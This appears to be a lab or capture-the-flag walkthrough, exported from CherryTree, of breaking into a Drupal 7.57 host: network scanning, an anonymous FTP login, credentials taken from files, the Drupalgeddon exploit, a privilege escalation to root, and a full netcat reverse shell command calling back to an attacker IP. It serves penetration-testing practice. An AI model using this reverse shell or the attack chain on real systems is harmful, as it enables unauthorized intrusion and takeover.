<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>One path for exploitation</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>One path for exploitation</h1><br/><p># I discovered the target machine on my network utilizing netdiscover</p><p> sudo netdiscover -P -i eth0 -r 10.0.0.0/24</p><p> </p><p> </p><p> # After my initial port scan on the target machine I was able to identify two open ports. 22 and 80. ftp and http respectivly.</p><p></p><p> </p><p> # After discovering the initial ports I started an indepth nmap scan to enumerate service version and potential basic vulnerabilities with the scripted scan built into nmap. The results of this indepth scan presented that I would be able to log into ftp anonymously.</p><p> nmap -p 21,80 -sC -sV 10.0.0.168</p><p>  </p><p> # With the above information I began brute forcing directories and scanning for basic web vulnerbilities utilizing dirb and nikto.</p><p></p><p># While the dirb and nikto and running I logged into the ftp service with <span style="color:#e01b24;">anonymous:anonymous</span> credentials to see if I am able to retreive the passwords.zip file.</p><p>ftp &lt;ip address&gt;</p><p>ls</p><p>mget *</p><p></p><p># Since I was able to extract the files on the ftp server I attempted to unzip the passwords.zip file to see the contents, as well as read the welcome.msg and look at the .jpg.</p><p></p><p># The .zip file contained credentials and the welcome message just pointed out that they were trying out the ftp server.</p><p>unzip passwords.zip</p><p>cat passwords.txt</p><p></p><p># We now have credentials </p><p><span style="color:#e01b24;">drupaladmin:m1nty22</span></p><p><span style="color:#e01b24;">marcus:qwer</span></p><p></p><p># We were able to successfully log into the ftp server with <span style="color:#e01b24;">drupaladmin:m1nty22</span> and are in the /opt/drupaladmin directory on the target system.</p><p>ftp drupaladmin@10.0.0.83</p><p></p><p># We are able to cd around the file system with this ftp session. I was able to cd to the /home directory and see a directory called test. While enumeration the /home/test directory I noticed many files on pointing to drupal-7.57 and multiple password files. There was a backup directory that had yet another password file in it.</p><p></p><p># I was able to crawl around the file system in this ftp connection and found a CHANGELOG.txt file and yet another directory that points to drupal in the /var/www/html directory. I believe the http port is hosting a drupal CMS site. Going to verify this information as there are default settings files located in CMS web site builders.</p><p></p><p># Downloaded the CHANGELOG.txt file using get command to see if this was the correct version of drupal running.</p><p></p><p># I was able to find and download the settings.php file located at /var/www/html/sites/default/settings.php which is the settings file for drupal CMS instances that contain hard coded credentials. </p><p></p><p># I was able to find hard coded credentials in the settings.php file. I now have credentials to the database that drupal is built on.</p><p><img src="images/34-1.png" alt="images/34-1.png" /></p><p><h1>drupaladmin:P@55</h1></p><p># The changelog file shows me drupals exact version. 7.57</p><p></p><p># A quick google search provided 4 potential exploits for our drupal version.</p><p><a href="https://github.com/pimps/CVE-2018-7600">https://github.com/pimps/CVE-2018-7600</a></p><p><a href="https://www.exploit-db.com/exploits/44449">https://www.exploit-db.com/exploits/44449</a></p><p></p><p># Utilizing one of the drupal exploits that we were able to find using the CHANGELOG.txt version provided we were able to establish a shell after generating a reverse shell syntax using the shell generation site below.</p><p><a href="https://github.com/pimps/CVE-2018-7600">https://github.com/pimps/CVE-2018-7600</a></p><p><a href="https://www.revshells.com/">https://www.revshells.com/</a></p><p># Found some syntax that worked for this exploit.</p><p><span style="color:#3584e4;">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.0.0.194 4444 &gt;/tmp/f</span></p><p><img src="images/34-2.png" alt="images/34-2.png" /></p><p>open a listener</p><p></p><p></p><p># Collected kernel information utilizing the &quot;uname -a&quot; command and was able to find an exploit, download it to kali, host a server, move it over to the target machine in their /tmp directory, compile it and run it.</p><p><a href="https://www.exploit-db.com/exploits/41458">https://www.exploit-db.com/exploits/41458</a></p><p>downlaod file using wget on kali</p><p>set up a server </p><p>python3 -m http.server 1234 to transfer exploit file to target machine</p><p></p><p># When the exploit was ran after being compiled I was presented a root shell and had full access to the drup machines file system.</p><p>gcc 41458.c -o 41458</p><p>./41458</p><p></p><p></p></div>
</body>
</html>
